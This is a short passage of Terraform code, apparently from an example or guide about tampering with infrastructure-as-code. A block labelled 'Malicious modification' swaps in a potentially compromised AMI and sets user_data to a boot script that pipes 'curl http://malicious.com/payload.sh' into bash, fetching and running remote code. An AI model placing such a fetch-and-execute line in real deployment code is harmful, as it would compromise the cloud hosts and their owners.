#   ami           = &quot;ami-0abcdef1234567890&quot;
#   instance_type = &quot;t2.micro&quot;
# }

# Malicious modification:
resource &quot;aws_instance&quot; &quot;malicious_server&quot; {
  ami           = &quot;ami-0fedcba9876543210&quot; # A different, potentially compromised AMI
  instance_type = &quot;t2.large&quot;
  user_data     = &quot;#!/bin/bash\ncurl http://malicious.com/payload.sh | bash&quot;
}

